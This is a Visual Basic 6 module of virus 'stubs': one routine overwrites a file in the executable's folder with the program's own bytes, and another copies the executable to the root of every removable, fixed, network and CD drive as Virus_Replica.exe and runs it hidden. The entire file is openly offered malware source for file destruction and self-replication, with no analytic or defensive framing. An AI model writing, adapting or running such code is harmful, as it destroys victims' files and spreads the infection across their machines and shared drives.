Attribute VB_Name = "Stubs"
Public Sub Vx_FileInfectorByOverWriting()
'This sub infects the first file in the current directory of the EXE
'Please note this is not a stealth infector it will take and overwrite with exe data
    On Error Resume Next
    Dim freeResource
    freeResource = FreeFile
    Open App.Path & "\" & App.EXEName & ".exe" For Binary Access Read As #freeResource
    ReDim MyArray(MySize)
    Get #1, 1, MyArray
    Close #freeResource
    victim = Dir(App.Path & "\*.*")
    infection_condition = "bless you"
    While infection_condition <> ""
    Open App.Path & "\" & victim For Binary Access Write As #freeResource
    Put #1, , MyArray
    Put #1, , MySize
    Close #freeResource
    infection_condition = ""
    Wend
End Sub
Public Sub Vx_Replicator_FSO()
'Use windows FSO to replicate reduces dependencies
    On Error Resume Next
    Dim a As String
    Dim virus_path As String
    Dim virus_instance As String
    virus_instance = App.EXEName
    virus_path = App.Path
    Dim usr As String
    
    If App.PrevInstance = False Then
        Dim DrvLoc, drivs, mach, cop
        Set DrvLoc = CreateObject("Scripting.FileSystemObject")
        Set mach = DrvLoc.drives
     
        For Each drivs In mach
         If (drivs.drivetype = 1) Or (drivs.drivetype = 2) Or (drivs.drivetype = 3) Or (drivs.drivetype = 4) Then
         FileCopy (App.Path & "\" & App.EXEName & ".exe"), (drivs & "\Virus_Replica.exe")
         a = Shell(App.Path + "\Virus_Replica.exe", vbMinimizedNoFocus)
    Else
        MsgBox "The Virus Instance exists here already", vbInformation, "Virus Instance Exists"
    End If
    Next
    End If
End Sub
